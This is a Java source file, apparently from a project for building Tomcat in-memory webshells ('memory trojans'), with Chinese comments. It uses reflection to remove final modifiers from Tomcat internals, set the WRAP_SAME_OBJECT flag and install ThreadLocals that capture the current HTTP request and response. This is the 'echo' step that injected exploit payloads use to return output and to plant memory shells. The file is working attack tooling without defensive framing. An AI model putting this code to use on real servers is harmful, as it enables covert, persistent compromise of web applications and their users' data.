package com.yyjccc.memorytrojan.Echo;

import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class TomcatEcho {
	public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
		//反射获取所需属性
		Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
		Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
		Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

		//使用modifiersField反射修改final型变量
		Field modifiersField = Field.class.getDeclaredField("modifiers");
		modifiersField.setAccessible(true);
		modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
		modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
		modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
		WRAP_SAME_OBJECT_FIELD.setAccessible(true);
		lastServicedRequestField.setAccessible(true);
		lastServicedResponseField.setAccessible(true);

		//将变量WRAP_SAME_OBJECT_FIELD设置为true
		if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){
			WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
		}

		if (lastServicedRequestField.get(null)==null){
			lastServicedRequestField.set(null, new ThreadLocal<>());
		}

		if (lastServicedResponseField.get(null)==null){
			lastServicedResponseField.set(null, new ThreadLocal<>());
		}


		if(lastServicedRequestField.get(null)!=null){
			ThreadLocal threadLocal =
					 (ThreadLocal) lastServicedRequestField.get(null);
			ServletRequest servletRequest = (ServletRequest) threadLocal.get();
			System.out.println(servletRequest);
			System.out.println((HttpServletRequest) servletRequest);
		}
	}
}
